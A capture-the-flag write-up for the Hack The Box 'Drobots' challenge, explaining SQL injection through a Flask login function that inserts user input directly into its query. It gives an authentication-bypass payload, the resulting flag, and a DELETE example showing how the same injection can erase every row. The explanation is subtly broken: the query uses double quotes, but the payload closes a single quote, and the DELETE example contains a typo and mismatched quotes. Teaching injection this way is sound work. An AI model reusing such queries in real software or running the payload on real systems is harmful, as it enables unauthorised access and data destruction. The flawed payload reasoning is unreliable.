## Drobots :: Easy
#### Scenario

```
Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities.
Can you help pandora with this task?
```

#### Solve

![](/images/drobots-source-tree.png)

This is an SQL challenge.  
It is the made to introduce the concept of SQL Injection.  

Starting the challenge we arrive at this login page:  

![](/images/drobot_login.png)

Let's take a look at the source code that handle our login request.  
This application is written using the Flask microservice framework.  

This code is located in the `database.py` file.  
```python
from colorama import Cursor
from application.util import createJWT
from flask_mysqldb import MySQL

mysql = MySQL()

def query_db(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False
```

The login function is vulnerable to SQL injection.  
We can see on this line:  

```python
user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)
```

The `username` and `password` specified by the user is directly placed in the query.  
Since there is not sanitization, we can bypass the login.  

```sql
USERNAME: admin
PASSWORD: ' or 1=1;--
```

This allows us to log in and obtain the flag !  

```text
HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}
```

No script for this one, since it's only a single form.  
  
##### Important note on the use of `' or 1=1;--`

This injection is normally not recommended, as it can cause damage when used blindly.  

For example, if the injection is in a `DELETE` statement, then we could delete every entry by using it blindly.  

```python
# Example of a query to delete a single user:
f'DELETE FROM users WHERE username="{username}"'

# After injection with ' or 1=1; --
'DELETE FROM users WHERE usernames="" or 1=1; --'

# This will cause every user to be deleted, since the OR is always true, all entries will be matched.
```

In our case though, we have the source code and we know that it is not harmful.  


